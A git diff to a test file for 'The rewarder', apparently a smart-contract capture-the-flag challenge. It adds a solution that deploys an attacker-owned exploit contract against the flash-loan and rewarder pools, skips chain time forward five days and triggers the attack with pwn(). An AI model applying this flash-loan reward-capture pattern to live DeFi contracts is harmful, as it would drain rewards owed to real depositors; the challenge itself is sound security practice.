@@ -65,7 +65,13 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+	// Deploy the exploit contract that was created under the /contracts folder.
+    	const ExploitFactory = await ethers.getContractFactory('RewarderExploit', attacker);
+	const exploit = await ExploitFactory.deploy(TOKENS_IN_LENDER_POOL, this.flashLoanPool.address, this.rewarderPool.address);
+    	// We wait 5 days, for the next round to start.
+    	await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+    	// Execute exploit
+    	await exploit.pwn();
     });
 
     after(async function () {
